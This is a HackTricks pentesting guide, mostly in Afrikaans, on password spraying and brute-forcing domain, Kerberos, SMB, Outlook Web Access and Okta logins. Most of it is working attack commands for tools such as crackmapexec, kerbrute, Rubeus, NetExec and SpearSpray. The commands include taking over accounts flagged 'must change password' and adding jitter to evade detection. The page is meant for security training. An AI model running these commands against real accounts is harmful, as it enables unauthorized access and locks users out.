# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Sodra jy verskeie **valid usernames** gevind het, kan jy die mees **common passwords** probeer (hou die password policy van die omgewing in gedagte) vir elkeen van die ontdekte users.\
By **default** die **minimum** **password** **length** is **7**.

Lyste van common usernames kan ook nuttig wees: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Let wel dat jy sommige accounts kan lockout as jy verskeie verkeerde passwords probeer (by default meer as 10).

### Kry password policy

As jy enige user credentials of 'n shell as 'n domain user het, kan jy **get the password policy with**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Eksploitasie vanaf Linux (of almal)

- Gebruik van **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Gebruik [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(jy kan die aantal pogings aandui om lockouts te vermy):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Gebruik [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NIE AANBEVEELD; SOMS WERK DIT NIE
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Met die `scanner/smb/smb_login` module van **Metasploit**:

![](<../../images/image (745).png>)

- Deur **rpcclient** te gebruik:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Vanaf Windows

- Met [Rubeus](https://github.com/Zer1t0/Rubeus) weergawe met brute-module:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Met [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Dit kan standaard gebruikers uit die domein genereer, en dit haal die wagwoordbeleid van die domein op en beperk die pogings ooreenkomstig daaraan):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Met [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Identifiseer en Oorneem "Password must change at next logon" Rekeninge (SAMR)

'n Lae-ruis tegniek is om 'n onskadelike/leë wagwoord te spray en rekeninge vas te vang wat STATUS_PASSWORD_MUST_CHANGE teruggee, wat aandui dat die wagwoord gedwinglik verval is en sonder kennis van die ou een verander kan word.

Werksvloei:
- Enumereer gebruikers (RID brute via SAMR) om die teikelys op te bou:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spray 'n leë password en hou aan met hits om rekeninge te vang wat by die volgende logon verander moet word:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Vir elke treffer, verander die wagwoord oor SAMR met NetExec’s module (geen ou wagwoord nodig wanneer "must change" ingestel is):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Operasionele notas:
- Maak seker jou gasheerklok is gesinkroniseer met die DC voordat Kerberos-gebaseerde operasies uitgevoer word: `sudo ntpdate <dc_fqdn>`.
- 'n [+] sonder (Pwn3d!) in sommige modules (bv. RDP/WinRM) beteken die creds is geldig, maar die rekening het geen interaktiewe aanmeldregte nie.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying met LDAP-targeting en PSO-bewuste throttling (SpearSpray)

Kerberos pre-auth–based spraying verminder geraas teenoor SMB/NTLM/LDAP bind-pogings en stem beter ooreen met AD lockout-beleid. SpearSpray koppel LDAP-driven targeting, 'n pattern engine, en beleidbewustheid (domain policy + PSOs + badPwdCount buffer) om presies en veilig te spray. Dit kan ook gekompromitteerde principals in Neo4j merk vir BloodHound pathing.

Sleutelidees:
- LDAP-gebruikersontdekking met paging en LDAPS-ondersteuning, opsioneel met aangepaste LDAP-filters.
- Domain lockout-beleid + PSO-bewuste filtering om 'n konfiguureerbare pogingbuffer (drempel) oor te laat en te verhoed dat gebruikers gelock word.
- Kerberos pre-auth validasie gebruik vinnige gssapi bindings (genereer 4768/4771 op DCs in plaas van 4625).
- Patroon-gebaseerde, per-gebruiker wagwoordgenerasie wat veranderlikes gebruik soos name en temporale waardes afgelei van elke gebruiker se pwdLastSet.
- Deursetbeheer met threads, jitter, en maksimum versoeke per sekonde.
- Opsionele Neo4j-integrasie om oorheersde gebruikers te merk vir BloodHound.

Basiese gebruik en ontdekking:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Teiken- en patroonbeheer:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Stealth en veiligheidskontroles:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound verryking:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Oorsig van die patroonstelsel (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Beskikbare veranderlikes sluit in:
- {name}, {samaccountname}
- Tydelike waardes van elke gebruiker se pwdLastSet (of whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Samestellingshelpers en org-token: {separator}, {suffix}, {extra}

Operasionele notas:
- Voorkeur om die PDC-emulator met -dc te bevraagteken om die mees gesaghebbende badPwdCount en beleidverwante inligting te lees.
- badPwdCount-herstellings word geaktiveer op die volgende poging ná die waarnemingsvenster; gebruik drempelwaardes en tydsberekening om veilig te bly.
- Kerberos pre-auth-pogings verskyn as 4768/4771 in DC-telemetrie; gebruik jitter en rate-limiting om in te meng.

> Wenk: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.

## Outlook Web Access

Daar is verskeie gereedskap vir p**assword spraying outlook**.

- Met [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- Met [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Met [Ruler](https://github.com/sensepost/ruler) (betroubaar!)
- Met [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- Met [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Om enige van hierdie gereedskap te gebruik, het jy 'n gebruikerslys en 'n password / 'n klein lys passwords nodig om te spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Verwysings

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)


{{#include ../../banners/hacktricks-training.md}}
